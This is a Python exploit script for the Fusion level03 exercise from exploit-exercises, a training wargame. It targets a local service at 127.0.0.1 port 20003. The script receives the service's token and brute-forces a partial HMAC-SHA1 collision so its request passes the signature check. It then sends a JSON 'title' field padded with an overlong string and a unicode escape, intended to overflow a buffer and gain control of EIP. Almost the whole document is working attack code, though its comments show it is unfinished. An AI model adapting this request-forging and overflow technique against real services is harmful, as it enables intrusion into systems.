# exploit-exercises - fusion - level03
# exploit by @vnico
# current status:
# partial collision hash: OK
# EIP: OK 
# http://vnico.mundodisco.net
import socket
from struct import pack
from hashlib import sha1
import hmac
import json


def sign_request(token, request):
	hashed = hmac.new(token, request, sha1)
	return hashed.digest()

def collide(token, dict_request):
	i = 0
	while True:
		dict_request['c'] = i
		attempt = sign_request(token, '{0}\n{1}'.format(token, json.dumps(dict_request)))	
		if attempt.encode('hex')[:4] == '0000':
			print '[*] Collision found: {0}'.format(attempt.encode('hex'))
			print '[*] Collision request: {0}'.format(json.dumps(dict_request))
			return dict_request
		i += 1

HOST = '127.0.0.1'
PORT = 20003
DICT_REQUEST = { 'title': 'title', 'contents': 'contents', 'tags': ['tag1', 'tag2'], 'serverip': '127.0.0.1' }
DICT_REQUEST['title'] = 'A' * 127 + '\u4141' + 'A'*1024

print '[*] Connecting to service...'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
token = s.recv(128)
token = token.strip().strip('"')
print '[*] Received token {0}'.format(token)
print '[*] Original hash: {0}'.format(sign_request(token, '{0}\n{1}'.format(token, json.dumps(DICT_REQUEST))).encode('hex'))
collider = collide(token, DICT_REQUEST)
s.sendall('{0}\n{1}'.format(token, json.dumps(DICT_REQUEST)))
s.close()
